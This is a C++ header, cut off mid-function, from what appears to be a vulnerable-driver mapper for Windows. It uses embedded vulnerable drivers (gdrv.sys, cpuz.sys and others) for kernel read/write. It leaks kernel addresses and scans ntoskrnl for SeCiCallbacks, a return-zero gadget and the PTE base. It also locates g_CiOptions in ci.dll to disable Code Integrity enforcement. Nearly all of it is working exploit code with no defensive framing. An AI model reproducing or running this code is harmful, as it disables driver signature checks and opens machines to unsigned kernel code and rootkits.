#pragma once
#include <Windows.h>
#include <Psapi.h>
#include <string>
#include <vector>
#include <cstdint>
#include <cstdio>

#include "gdrv_resource.hpp"
#include "lnvmsrio_resource.hpp"
#include "atszio_resource.hpp"
#include "directio_resource.hpp"
#include "cpuz_resource.hpp"
#include "kernel_rw.h"

namespace GdrvMapper {

struct CiCallbackSwap {
    DWORD64 seCiCallbacksBase;       // Kernel VA of SeCiCallbacks structure
    DWORD64 retZeroGadget;           // Kernel VA of "xor eax,eax; ret" gadget (returns STATUS_SUCCESS)
    DWORD64 zwFlushInstructionCache;  // ZwFlushInstructionCache kernel VA (fallback)
    DWORD64 pteBase;                 // PTE self-map base (for code-page patching)
};

// Vulnerable driver descriptor — each backend has one of these
struct VulnDriver {
    const char*    name;          // display name
    const uint8_t* data;          // embedded .sys bytes
    size_t         dataSize;      // byte count (0 = not embedded)
    const char*    deviceString;  // e.g. "\\\\.\\GIO"
    KernelRW::Backend backend;    // which kernel R/W backend it feeds
};

static const VulnDriver g_vulnDrivers[] = {
    { "ATSZIO64.sys", atszio_resource::driver, atszio_resource::driver_size,
      "\\\\.\\ATSZIO", KernelRW::Backend::ATSZIO },
    { "gdrv.sys",     gdrv_resource::driver,    gdrv_resource::driver_size,
      "\\\\.\\GIO",   KernelRW::Backend::GIO },
    { "DirectIo64.sys", directio_resource::driver, directio_resource::driver_size,
      "\\\\.\\DirectIo64", KernelRW::Backend::DIRECTIO },
    { "cpuz.sys",     cpuz_resource::driver,    cpuz_resource::driver_size,
      "\\\\.\\CPUZ149", KernelRW::Backend::CPUZ },
};
static constexpr int g_numVulnDrivers = sizeof(g_vulnDrivers) / sizeof(g_vulnDrivers[0]);

// ── Privilege helpers ────────────────────────────────────────────────────

static bool EnablePrivilege(ULONG privilege) {
    typedef NTSTATUS(NTAPI* RtlAdjustPrivilege_t)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
    auto pAdj = (RtlAdjustPrivilege_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "RtlAdjustPrivilege");
    if (!pAdj) return false;
    BOOLEAN wasEnabled = FALSE;
    return pAdj(privilege, TRUE, FALSE, &wasEnabled) >= 0;
}

// ── Kernel module enumeration ────────────────────────────────────────────

static ULONG_PTR GetKernelModuleAddress(const char* name) {
    typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);
    auto NtQSI = (NtQuerySystemInformation_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    // Win11 25H2+ requires SeDebugPrivilege for kernel module enumeration
    EnablePrivilege(20 /*SeDebugPrivilege*/);

    // Method 1: NtQuerySystemInformation(SystemModuleInformation)
    if (NtQSI) {
        DWORD size = 0;
        NtQSI(11, nullptr, 0, &size);
        if (size) {
            std::vector<uint8_t> buf(size * 2);
            NTSTATUS st = NtQSI(11, buf.data(), (ULONG)buf.size(), nullptr);
            if (st >= 0) {
                struct MODULE_INFO { HANDLE Section; PVOID MappedBase; PVOID ImageBase; ULONG ImageSize; ULONG Flags; USHORT LoadOrderIndex; USHORT InitOrderIndex; USHORT LoadCount; USHORT OffsetToFileName; UCHAR FullPathName[256]; };
                struct MODULES { ULONG Count; MODULE_INFO Modules[1]; };
                auto* mods = (MODULES*)buf.data();
                for (ULONG i = 0; i < mods->Count; i++) {
                    const char* cur = (const char*)mods->Modules[i].FullPathName + mods->Modules[i].OffsetToFileName;
                    if (_stricmp(cur, name) == 0)
                        return (ULONG_PTR)mods->Modules[i].ImageBase;
                }
            }
        }
    }

    // Method 2: EnumDeviceDrivers (PSAPI)
    LPVOID drivers[2048];
    DWORD cbNeeded = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        int count = cbNeeded / sizeof(LPVOID);
        if (count > 2048) count = 2048;
        for (int i = 0; i < count; i++) {
            char baseName[256] = {};
            if (GetDeviceDriverBaseNameA(drivers[i], baseName, sizeof(baseName))) {
                if (_stricmp(baseName, name) == 0)
                    return (ULONG_PTR)drivers[i];
            }
        }
    }

    // Method 3: SystemExtendedHandleInformation (class 64) leaks kernel object
    // addresses even when module enumeration is restricted. We use the handle query
    // to force the privilege token to take effect, then retry EnumDeviceDrivers.
    if (NtQSI && _stricmp(name, "ntoskrnl.exe") == 0) {
        DWORD size2 = 0;
        NtQSI(64, nullptr, 0, &size2);
        if (size2) {
            std::vector<uint8_t> hbuf(size2 * 2);
            NtQSI(64, hbuf.data(), (ULONG)hbuf.size(), &size2);

            // Retry EnumDeviceDrivers — the SeDebugPrivilege enable above
            // may not have taken effect until after the first attempt
            if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded > 0) {
                int count2 = cbNeeded / sizeof(LPVOID);
                for (int i = 0; i < count2 && i < 2048; i++) {
                    char bn[256] = {};
                    if (GetDeviceDriverBaseNameA(drivers[i], bn, sizeof(bn))) {
                        if (_stricmp(bn, name) == 0)
                            return (ULONG_PTR)drivers[i];
                    }
                }
                // ntoskrnl is always the first loaded module
                if (count2 > 0 && (ULONG_PTR)drivers[0] > 0xFFFF000000000000ULL)
                    return (ULONG_PTR)drivers[0];
            }
        }
    }

    return 0;
}

// ── Pattern scan for SeCiCallbacks ───────────────────────────────────────

static CiCallbackSwap FindCiValidateEntry(ULONG_PTR kBase, std::string& diag) {
    CiCallbackSwap result = {};
    char tmp[256];

    if (!kBase) { diag = "kBase=0"; return result; }

    HMODULE uNt = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!uNt) { diag = "LoadLibrary ntoskrnl failed"; return result; }

    DWORD64 uAddr = (DWORD64)uNt;
    MODULEINFO modInfo = {};
    if (!GetModuleInformation(GetCurrentProcess(), uNt, &modInfo, sizeof(modInfo)) || !modInfo.SizeOfImage) {
        diag = "GetModuleInformation(ntoskrnl) failed";
        FreeLibrary(uNt);
        return result;
    }

    sprintf_s(tmp, "img=0x%llX sz=0x%X kBase=0x%llX", uAddr, modInfo.SizeOfImage, (DWORD64)kBase);
    diag = tmp;

    DWORD64 zwFlush = (DWORD64)GetProcAddress(uNt, "ZwFlushInstructionCache");
    if (!zwFlush) { diag += " | ZwFlush=NULL"; FreeLibrary(uNt); return result; }
    zwFlush = zwFlush - uAddr + kBase;

    // Parse PE sections
    auto dos = (PIMAGE_DOS_HEADER)uAddr;
    auto ntHdr = (PIMAGE_NT_HEADERS)(uAddr + dos->e_lfanew);
    auto sects = IMAGE_FIRST_SECTION(ntHdr);
    DWORD dataRVA = 0, dataSize = 0;
    for (WORD si = 0; si < ntHdr->FileHeader.NumberOfSections; si++) {
        if (memcmp(sects[si].Name, ".data", 5) == 0 && (sects[si].Name[5] == '\0' || sects[si].Name[5] == '$')) {
            dataRVA = sects[si].VirtualAddress;
            dataSize = sects[si].Misc.VirtualSize;
            break;
        }
    }
    sprintf_s(tmp, " | .data RVA=0x%X sz=0x%X", dataRVA, dataSize);
    diag += tmp;

    // Scan ntoskrnl .text for "xor eax,eax; ret" gadget (returns STATUS_SUCCESS)
    // On Win11 25H2, SeCiCallbacks are called even with g_CiOptions=0.
    // ZwFlushInstructionCache returns non-zero with CI args → 0xC0000428.
    // This gadget returns 0 (STATUS_SUCCESS) regardless of arguments.
    DWORD64 retZeroGadget = 0;
    for (WORD si = 0; si < ntHdr->FileHeader.NumberOfSections && !retZeroGadget; si++) {
        if (!(sects[si].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        auto* codeBase = (unsigned char*)(uAddr + sects[si].VirtualAddress);
        DWORD codeSz = sects[si].Misc.VirtualSize;
        // Prefer gadgets at function boundaries (preceded by CC/90/C3)
        for (DWORD off = 1; off + 3 <= codeSz; off++) {
            unsigned char prev = codeBase[off - 1];
            if (prev != 0xCC && prev != 0x90 && prev != 0xC3) continue;
            if ((codeBase[off] == 0x33 || codeBase[off] == 0x31) &&
                codeBase[off + 1] == 0xC0 && codeBase[off + 2] == 0xC3) {
                retZeroGadget = kBase + sects[si].VirtualAddress + off;
                break;
            }
        }
    }
    // Fallback: any xor eax,eax; ret in any executable section
    if (!retZeroGadget) {
        for (WORD si = 0; si < ntHdr->FileHeader.NumberOfSections && !retZeroGadget; si++) {
            if (!(sects[si].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
            auto* codeBase = (unsigned char*)(uAddr + sects[si].VirtualAddress);
            DWORD codeSz = sects[si].Misc.VirtualSize;
            for (DWORD off = 0; off + 3 <= codeSz; off++) {
                if ((codeBase[off] == 0x33 || codeBase[off] == 0x31) &&
                    codeBase[off + 1] == 0xC0 && codeBase[off + 2] == 0xC3) {
                    retZeroGadget = kBase + sects[si].VirtualAddress + off;
                    break;
                }
            }
        }
    }
    if (retZeroGadget) {
        sprintf_s(tmp, " | ret0=0x%llX", (unsigned long long)retZeroGadget);
        diag += tmp;
    } else {
        diag += " | ret0=miss(using ZwFlush)";
    }

    // Scan for PTE self-map base (inlined MiGetPteAddress: shr reg,9 + mov reg,imm64)
    DWORD64 pteBase = 0;
    {
        auto* code = (unsigned char*)uAddr;
        for (DWORD i = 0; i + 20 < modInfo.SizeOfImage && !pteBase; i++) {
            if ((code[i] & 0xFE) != 0x48 || code[i+1] != 0xC1) continue;
            if ((code[i+2] & 0xF8) != 0xE8 || code[i+3] != 0x09) continue;
            for (int j = 4; j < 24 && i + j + 10 < modInfo.SizeOfImage; j++) {
                if ((code[i+j] & 0xFE) != 0x48) continue;
                if (code[i+j+1] < 0xB8 || code[i+j+1] > 0xBF) continue;
                DWORD64 cand = *(DWORD64*)(code + i + j + 2);
                if ((cand >> 48) != 0xFFFF || (cand & 7)) continue;
                pteBase = cand;
                break;
            }
        }
    }
    if (pteBase) {
        sprintf_s(tmp, " | pte=0x%llX", (unsigned long long)pteBase);
        diag += tmp;
    }

    auto resolveLea = [&](DWORD64 leaInstr, DWORD64& outRVA) -> bool {
        int32_t disp = *(int32_t*)(leaInstr + 3);
        DWORD64 tgt = leaInstr + 7 + disp;
        outRVA = tgt - uAddr;
        return outRVA < modInfo.SizeOfImage;
    };

    auto setResult = [&](DWORD64 rva) {
        result.seCiCallbacksBase = kBase + rva;
        result.retZeroGadget = retZeroGadget;
        result.zwFlushInstructionCache = zwFlush;
        result.pteBase = pteBase;
    };

    // === Phase 1: Specific byte patterns ===
    struct CiPat { const unsigned char* b; int len; int leaOff; };
    const unsigned char p1[]  = { 0xFF, 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05 };
    const unsigned char p2[]  = { 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05 };
    const unsigned char p3[]  = { 0x48, 0x8B, 0xCB, 0x4C, 0x8D, 0x05 };
    const unsigned char p4[]  = { 0x33, 0xD2, 0x4C, 0x8D, 0x05 };
    const unsigned char p5[]  = { 0x33, 0xC9, 0x4C, 0x8D, 0x05 };
    const unsigned char p6[]  = { 0x48, 0x8B, 0xD6, 0x4C, 0x8D, 0x05 };
    const unsigned char p7[]  = { 0x48, 0x8B, 0xD7, 0x4C, 0x8D, 0x05 };
    const unsigned char p8[]  = { 0x49, 0x8B, 0xD6, 0x4C, 0x8D, 0x05 };
    const unsigned char p9[]  = { 0x49, 0x8B, 0xD7, 0x4C, 0x8D, 0x05 };
    const unsigned char p10[] = { 0x48, 0x8B, 0xCF, 0x4C, 0x8D, 0x05 };
    const unsigned char p11[] = { 0x84, 0xC0, 0x4C, 0x8D, 0x05 };
    const unsigned char p12[] = { 0xC3, 0xCC, 0x4C, 0x8D, 0x05 };
    const unsigned char p13[] = { 0x45, 0x33, 0xC0, 0x4C, 0x8D, 0x05 };
    const unsigned char p14[] = { 0x45, 0x33, 0xC9, 0x4C, 0x8D, 0x05 };
    const unsigned char p20[] = { 0x33, 0xC9, 0x48, 0x8D, 0x15 };
    const unsigned char p21[] = { 0x45, 0x33, 0xC0, 0x48, 0x8D, 0x15 };
    const unsigned char p22[] = { 0x45, 0x33, 0xC9, 0x48, 0x8D, 0x15 };
    const unsigned char p23[] = { 0x33, 0xD2, 0x48, 0x8D, 0x15 };
    const unsigned char p30[] = { 0x33, 0xD2, 0x48, 0x8D, 0x0D };
    const unsigned char p31[] = { 0x45, 0x33, 0xC0, 0x48, 0x8D, 0x0D };
    CiPat patterns[] = {
        { p1,  7, 4 }, { p2,  6, 3 }, { p3,  6, 3 }, { p4,  5, 2 },
        { p5,  5, 2 }, { p6,  6, 3 }, { p7,  6, 3 }, { p8,  6, 3 },
        { p9,  6, 3 }, { p10, 6, 3 }, { p11, 5, 2 }, { p12, 5, 2 },
        { p13, 6, 3 }, { p14, 6, 3 },
        { p20, 5, 2 }, { p21, 6, 3 }, { p22, 6, 3 }, { p23, 5, 2 },
        { p30, 5, 2 }, { p31, 6, 3 },
    };
    for (auto& pat : patterns) {
        for (unsigned int i = 0; i + pat.len + 4 < modInfo.SizeOfImage; i++) {
            bool match = true;
            for (int j = 0; j < pat.len; j++) {
                if (*(unsigned char*)(uAddr + i + j) != pat.b[j]) { match = false; break; }
            }
            if (!match) continue;
            DWORD64 rva = 0;
            if (resolveLea(uAddr + i + pat.leaOff, rva)) {
                sprintf_s(tmp, " | P1 hit @0x%X->RVA=0x%llX", i, rva);
                diag += tmp;
                setResult(rva);
                FreeLibrary(uNt);
                return result;
            }
        }
    }
    diag += " | P1=miss";

    // === Phase 2: Import-based — find CiInitialize IAT entry, scan near its call ===
    DWORD importDirRVA = ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    DWORD importDirSize = ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    DWORD ciInitIatRVA = 0;
    if (importDirRVA && importDirSize) {
        auto impDesc = (PIMAGE_IMPORT_DESCRIPTOR)(uAddr + importDirRVA);
        while (impDesc->Name) {
            const char* dllName = (const char*)(uAddr + impDesc->Name);
            if (_stricmp(dllName, "CI.dll") == 0 || _stricmp(dllName, "ci.dll") == 0) {
                auto origThunk = (PIMAGE_THUNK_DATA)(uAddr + impDesc->OriginalFirstThunk);
                auto thunk = (PIMAGE_THUNK_DATA)(uAddr + impDesc->FirstThunk);
                int idx = 0;
                while (origThunk->u1.AddressOfData) {
                    if (!(origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64)) {
                        auto hint = (PIMAGE_IMPORT_BY_NAME)(uAddr + (DWORD)origThunk->u1.AddressOfData);
                        if (strcmp(hint->Name, "CiInitialize") == 0) {
                            ciInitIatRVA = impDesc->FirstThunk + idx * sizeof(IMAGE_THUNK_DATA);
                            break;
                        }
                    }
                    origThunk++;
                    thunk++;
                    idx++;
                }
                break;
            }
            impDesc++;
        }
    }

    if (ciInitIatRVA) {
        sprintf_s(tmp, " | CiInit IAT=0x%X", ciInitIatRVA);
        diag += tmp;

        for (unsigned int i = 0; i + 6 < modInfo.SizeOfImage; i++) {
            if (*(unsigned char*)(uAddr + i) != 0xFF) continue;
            if (*(unsigned char*)(uAddr + i + 1) != 0x15) continue;

            int32_t disp = *(int32_t*)(uAddr + i + 2);
            DWORD64 callTargetFull = (uAddr + i + 6) + disp;
            DWORD64 callTargetRVA = callTargetFull - uAddr;

            if (callTargetRVA != ciInitIatRVA) continue;

            sprintf_s(tmp, " | CiInit call @0x%X", i);
            diag += tmp;

            unsigned char leaOps[][3] = {
                { 0x4C, 0x8D, 0x05 }, { 0x48, 0x8D, 0x15 },
                { 0x48, 0x8D, 0x0D }, { 0x4C, 0x8D, 0x0D },
            };
            for (int back = 7; back <= 80 && (int)i - back >= 0; back++) {
                unsigned int li = i - back;
                for (auto& op : leaOps) {
                    if (*(unsigned char*)(uAddr + li)     != op[0]) continue;
                    if (*(unsigned char*)(uAddr + li + 1) != op[1]) continue;
                    if (*(unsigned char*)(uAddr + li + 2) != op[2]) continue;

                    DWORD64 rva = 0;
                    if (!resolveLea(uAddr + li, rva)) continue;
                    if (rva >= modInfo.SizeOfImage) continue;

                    sprintf_s(tmp, " | P2 LEA @0x%X->RVA=0x%llX", li, rva);
                    diag += tmp;
                    setResult(rva);
                    FreeLibrary(uNt);
                    return result;
                }
            }
            diag += " | P2=no LEA near call";
        }
    } else {
        diag += " | CiInit IAT=not found";
    }

    // === Phase 3: Heuristic — any LEA to zero-init .data near a CALL ===
    if (dataRVA && dataSize > 0x28) {
        int leaCandidates = 0, inData = 0, aligned = 0, zeroOk = 0, callOk = 0;
        unsigned char leaOps[][3] = {
            { 0x4C, 0x8D, 0x05 }, { 0x48, 0x8D, 0x15 },
            { 0x48, 0x8D, 0x0D }, { 0x4C, 0x8D, 0x0D },
        };
        for (auto& op : leaOps) {
            for (unsigned int i = 0; i + 7 < modInfo.SizeOfImage; i++) {
                if (*(unsigned char*)(uAddr + i)     != op[0]) continue;
                if (*(unsigned char*)(uAddr + i + 1) != op[1]) continue;
                if (*(unsigned char*)(uAddr + i + 2) != op[2]) continue;
                leaCandidates++;

                DWORD64 rva = 0;
                if (!resolveLea(uAddr + i, rva)) continue;
                if (rva < dataRVA || rva + 0x28 > dataRVA + dataSize) continue;
                inData++;
                if (rva & 7) continue;
                aligned++;

                bool allZero = true;
                for (int z = 0; z < 0x28; z++) {
                    if (*(unsigned char*)(uAddr + rva + z) != 0) { allZero = false; break; }
                }
                if (!allZero) continue;
                zeroOk++;

                bool hasCall = false;
                for (int c = 7; c < 50 && (unsigned int)(i + c + 5) < modInfo.SizeOfImage; c++) {
                    unsigned char b = *(unsigned char*)(uAddr + i + c);
                    if (b == 0xE8) {
                        int32_t callDisp = *(int32_t*)(uAddr + i + c + 1);
                        DWORD64 callTgt = (uAddr + i + c + 5) + callDisp;
                        if (callTgt >= uAddr && callTgt < uAddr + modInfo.SizeOfImage) {
                            hasCall = true; break;
                        }
                    }
                    if (b == 0xFF && (unsigned int)(i + c + 1) < modInfo.SizeOfImage &&
                        *(unsigned char*)(uAddr + i + c + 1) == 0x15) { hasCall = true; break; }
                }
                if (!hasCall) continue;
                callOk++;

                sprintf_s(tmp, " | P3 @0x%X->RVA=0x%llX", i, rva);
                diag += tmp;
                setResult(rva);
                FreeLibrary(uNt);
                return result;
            }
        }
        sprintf_s(tmp, " | P3 stats: lea=%d inData=%d align=%d zero=%d call=%d",
                  leaCandidates, inData, aligned, zeroOk, callOk);
        diag += tmp;
    }

    FreeLibrary(uNt);
    return result;
}

// ── Find g_CiOptions in CI.dll ──────────────────────────────────────────
// g_CiOptions is the master switch for Code Integrity enforcement. Setting
// it to 0 disables ALL CI validation, regardless of how the kernel invokes
// CI.dll (callbacks, direct imports, inline calls). This is the primary
// bypass for Win11 25H2+ where SeCiCallbacks alone is no longer sufficient.

struct CiDataRange { DWORD rva; DWORD size; };

static int FindCiDataSections(DWORD64 uAddr, PIMAGE_NT_HEADERS ntHdr,
    CiDataRange* out, int maxOut)
{
    auto sects = IMAGE_FIRST_SECTION(ntHdr);
    int count = 0;
    for (WORD i = 0; i < ntHdr->FileHeader.NumberOfSections && count < maxOut; i++) {
        bool writable = (sects[i].Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
        bool code = (sects[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        if (writable && !code && sects[i].Misc.VirtualSize > 0) {
            out[count++] = { sects[i].VirtualAddress, sects[i].Misc.VirtualSize };
        }
    }
    return count;
}

struct CiCodeRange { DWORD rva; DWORD size; };

static int FindCiCodeSections(DWORD64 uAddr, PIMAGE_NT_HEADERS ntHdr,
    CiCodeRange* out, int maxOut)
{
    auto sects = IMAGE_FIRST_SECTION(ntHdr);
    int count = 0;
    for (WORD i = 0; i < ntHdr->FileHeader.NumberOfSections && count < maxOut; i++) {
        bool code = (sects[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        if (code && sects[i].Misc.VirtualSize > 0) {
            out[count++] = { sects[i].VirtualAddress, sects[i].Misc.VirtualSize };
        }
    }
    return count;
}

static bool CiInDataRange(DWORD64 rva, const CiDataRange* ranges, int count) {
    for (int i = 0; i < count; i++)
        if (rva >= ranges[i].rva && rva < ranges[i].rva + ranges[i].size) return true;
    return false;
}

static DWORD64 CiScanForDataRef(DWORD64 uAddr, unsigned char* start, int maxBytes,
    const CiDataRange* dataRanges, int dataCount, DWORD imageSize,
    int startOff = 0, int* hitOff = nullptr)
{
    for (int off = startOff; off < maxBytes; off++) {
        unsigned char* p = start + off;
        int dispOff = -1, instrLen = 0;

        // mov reg32, [rip+disp32]
        if (p[0] == 0x8B && (p[1] & 0xC7) == 0x05) {
            dispOff = 2; instrLen = 6;
        } else if ((p[0] & 0xFE) == 0x44 && p[1] == 0x8B && (p[2] & 0xC7) == 0x05) {
            dispOff = 3; instrLen = 7;
        }
        // REX.W mov r64, [rip+disp32]
        else if ((p[0] == 0x48 || p[0] == 0x4C) && p[1] == 0x8B && (p[2] & 0xC7) == 0x05) {
            dispOff = 3; instrLen = 7;
        }
        // mov [rip+disp32], reg32
        else if (p[0] == 0x89 && (p[1] & 0xC7) == 0x05) {
            dispOff = 2; instrLen = 6;
        }
        // REX.W mov [rip+disp32], r64
        else if ((p[0] == 0x48 || p[0] == 0x4C) && p[1] == 0x89 && (p[2] & 0xC7) == 0x05) {
            dispOff = 3; instrLen = 7;
        }
        // cmp [rip+disp32], imm8
        else if (p[0] == 0x83 && p[1] == 0x3D) {
            dispOff = 2; instrLen = 7;
        }
        // REX.W cmp qword [rip+disp32], imm8
        else if (p[0] == 0x48 && p[1] == 0x83 && p[2] == 0x3D) {
            dispOff = 3; instrLen = 8;
        }
        // cmp [rip+disp32], imm32
        else if (p[0] == 0x81 && p[1] == 0x3D) {
            dispOff = 2; instrLen = 10;
        }
        // REX.W cmp qword [rip+disp32], imm32
        else if (p[0] == 0x48 && p[1] == 0x81 && p[2] == 0x3D) {
            dispOff = 3; instrLen = 11;
        }
        // test [rip+disp32], imm32
        else if (p[0] == 0xF7 && p[1] == 0x05) {
            dispOff = 2; instrLen = 10;
        }
        // REX.W test qword [rip+disp32], imm32
        else if (p[0] == 0x48 && p[1] == 0xF7 && p[2] == 0x05) {
            dispOff = 3; instrLen = 11;
        }
        // and [rip+disp32], imm8
        else if (p[0] == 0x83 && p[1] == 0x25) {
            dispOff = 2; instrLen = 7;
        }
        // REX.W and qword [rip+disp32], imm8
        else if (p[0] == 0x48 && p[1] == 0x83 && p[2] == 0x25) {
            dispOff = 3; instrLen = 8;
        }
        // or [rip+disp32], imm8
        else if (p[0] == 0x83 && p[1] == 0x0D) {
            dispOff = 2; instrLen = 7;
        }
        // REX.W or qword [rip+disp32], imm8
        else if (p[0] == 0x48 && p[1] == 0x83 && p[2] == 0x0D) {
            dispOff = 3; instrLen = 8;
        }
        // bt [rip+disp32], imm8 (0F BA /4)
        else if (p[0] == 0x0F && p[1] == 0xBA && p[2] == 0x25) {
            dispOff = 3; instrLen = 8;
        }

        if (dispOff < 0) continue;

        int32_t disp = *(int32_t*)(p + dispOff);
        DWORD64 target = (DWORD64)(p + instrLen) + disp;
        DWORD64 targetRVA = target - uAddr;
        if (targetRVA >= imageSize) continue;
        if (!CiInDataRange(targetRVA, dataRanges, dataCount)) continue;
        if (targetRVA & 3) continue;

        DWORD val = *(DWORD*)target;
        if (val > 0x1000000) continue;

        if (hitOff) *hitOff = off;
        return targetRVA;
    }
    if (hitOff) *hitOff = maxBytes;
    return 0;
}

static DWORD64 FindCiOptions(ULONG_PTR kCiBase, const KernelRW::Context& krw, std::string& diag) {
    if (!kCiBase) { diag += " | CI kBase=0"; return 0; }

    HMODULE uCi = LoadLibraryExA("ci.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!uCi) { diag += " | ci.dll load fail"; return 0; }

    DWORD64 uAddr = (DWORD64)uCi;
    MODULEINFO modInfo = {};
    if (!GetModuleInformation(GetCurrentProcess(), uCi, &modInfo, sizeof(modInfo)) || !modInfo.SizeOfImage) {
        diag += " | GetModuleInformation(ci.dll) failed";
        FreeLibrary(uCi);
        return 0;
    }

    auto dos = (PIMAGE_DOS_HEADER)uAddr;
    auto ntHdr = (PIMAGE_NT_HEADERS)(uAddr + dos->e_lfanew);

    CiDataRange dataRanges[8] = {};
    int dataCount = FindCiDataSections(uAddr, ntHdr, dataRanges, 8);
    CiCodeRange codeRanges[8] = {};
    int codeCount = FindCiCodeSections(uAddr, ntHdr, codeRanges, 8);

    char tmp[256];

    if (!dataCount) {
        diag += " | CI .data=miss";
        FreeLibrary(uCi);
        return 0;
    }

    DWORD64 fallbackKv0RVA = 0;
    int fallbackKv0Refs = 0;
    const char* fallbackKv0Source = nullptr;

    // === Phase 1: Export-based scanning (512 bytes per export) ===
    const char* exports[] = {
        "CiValidateImageHeader", "CiValidateImageData", "CiInitializePolicy",
        "CiCheckPolicyInfo", "CiSetFileCache", "CiInitialize",
        "CiValidateFileAsImageType", "CiRegisterSIPolicy", "CiUnregisterSIPolicy",
    };
    static constexpr int NUM_EXPORTS = sizeof(exports) / sizeof(exports[0]);

    int foundExports = 0;
    for (int ei = 0; ei < NUM_EXPORTS; ei++) {
        DWORD64 func = (DWORD64)GetProcAddress(uCi, exports[ei]);
        if (!func) continue;
        foundExports++;

        int scanStart = 0;
        while (scanStart < 512) {
            int hitAt = 0;
            DWORD64 resultRVA = CiScanForDataRef(uAddr, (unsigned char*)func, 512,
                dataRanges, dataCount, modInfo.SizeOfImage, scanStart, &hitAt);
            if (!resultRVA) break;

            if (krw.type != KernelRW::Backend::NONE) {
                DWORD64 kVal = KernelRW::Read64(krw, kCiBase + resultRVA);
                DWORD kDword = (DWORD)(kVal & 0xFFFFFFFF);
                if (kDword == 0 || kDword > 0xFF) {
                    if (kDword == 0) {
                        if (resultRVA == fallbackKv0RVA) { fallbackKv0Refs++; }
                        else if (!fallbackKv0RVA) {
                            fallbackKv0RVA = resultRVA;
                            fallbackKv0Refs = 1;
                            fallbackKv0Source = exports[ei];
                        }
                    }
                    scanStart = hitAt + 1;
                    continue;
                }
                sprintf_s(tmp, " | ciOpt:%s RVA=0x%llX kv=%u",
                    exports[ei], (unsigned long long)resultRVA, kDword);
                diag += tmp;
                FreeLibrary(uCi);
                return kCiBase + resultRVA;
            }

            DWORD val = *(DWORD*)(uAddr + resultRVA);
            sprintf_s(tmp, " | ciOpt:%s RVA=0x%llX v=%u(noKrw)",
                exports[ei], (unsigned long long)resultRVA, val);
            diag += tmp;
            FreeLibrary(uCi);
            return kCiBase + resultRVA;
        }
    }

    sprintf_s(tmp, " | ciOpt P1:%d/%d miss", foundExports, NUM_EXPORTS);
    diag += tmp;

    // === Phase 2: Follow CALL targets from exports ===
    for (int ei = 0; ei < NUM_EXPORTS; ei++) {
        DWORD64 func = (DWORD64)GetProcAddress(uCi, exports[ei]);
        if (!func) continue;

        for (int off = 0; off < 128; off++) {
            unsigned char* p = (unsigned char*)(func + off);
            DWORD64 callTarget = 0;

            if (p[0] == 0xE8) {
                int32_t rel = *(int32_t*)(p + 1);
                callTarget = (DWORD64)(p + 5) + rel;
            }
            else if (p[0] == 0xE9) {
                int32_t rel = *(int32_t*)(p + 1);
                callTarget = (DWORD64)(p + 5) + rel;
            }

            if (!callTarget) continue;
            if (callTarget < uAddr || callTarget >= uAddr + modInfo.SizeOfImage) continue;

            DWORD64 ctRVA = callTarget - uAddr;
            bool ctInCode = false;
            for (int cc = 0; cc < codeCount; cc++) {
                if (ctRVA >= codeRanges[cc].rva && ctRVA < codeRanges[cc].rva + codeRanges[cc].size) {
                    ctInCode = true; break;
                }
            }
            if (!ctInCode) continue;

            int scanStart2 = 0;
            while (scanStart2 < 256) {
                int hitAt2 = 0;
                DWORD64 resultRVA = CiScanForDataRef(uAddr, (unsigned char*)callTarget, 256,
                    dataRanges, dataCount, modInfo.SizeOfImage, scanStart2, &hitAt2);
                if (!resultRVA) break;

                if (krw.type != KernelRW::Backend::NONE) {
                    DWORD64 kVal = KernelRW::Read64(krw, kCiBase + resultRVA);
                    DWORD kDword = (DWORD)(kVal & 0xFFFFFFFF);
                    if (kDword == 0 || kDword > 0xFF) {
                        if (kDword == 0) {
                            if (resultRVA == fallbackKv0RVA) { fallbackKv0Refs++; }
                            else if (!fallbackKv0RVA) {
                                fallbackKv0RVA = resultRVA;
                                fallbackKv0Refs = 1;
                                fallbackKv0Source = "P2";
                            }
                        }
                        scanStart2 = hitAt2 + 1;
                        continue;
                    }
                    sprintf_s(tmp, " | ciOpt P2:%s+%d->call RVA=0x%llX kv=%u",
                        exports[ei], off, (unsigned long long)resultRVA, kDword);
                    diag += tmp;
                    FreeLibrary(uCi);
                    return kCiBase + resultRVA;
                }

                DWORD val = *(DWORD*)(uAddr + resultRVA);
                sprintf_s(tmp, " | ciOpt P2:%s+%d->call RVA=0x%llX v=%u(noKrw)",
                    exports[ei], off, (unsigned long long)resultRVA, val);
                diag += tmp;
                FreeLibrary(uCi);
                return kCiBase + resultRVA;
            }
        }
    }

    diag += " | P2 miss";

    // === Phase 3: Brute-force — scan ALL code sections for .data refs ===
    struct CiCandidate { DWORD64 rva; DWORD val; int refs; };
    std::vector<CiCandidate> candidates;
    candidates.reserve(64);

    for (int ci = 0; ci < codeCount; ci++) {
        unsigned char* codeStart = (unsigned char*)(uAddr + codeRanges[ci].rva);
        DWORD codeSize = codeRanges[ci].size;

        for (DWORD off = 0; off + 10 < codeSize; off++) {
            unsigned char* p = codeStart + off;
            int dispOff = -1, instrLen = 0;

            if (p[0] == 0x8B && (p[1] & 0xC7) == 0x05) { dispOff = 2; instrLen = 6; }
            else if ((p[0] & 0xFE) == 0x44 && p[1] == 0x8B && (p[2] & 0xC7) == 0x05) { dispOff = 3; instrLen = 7; }
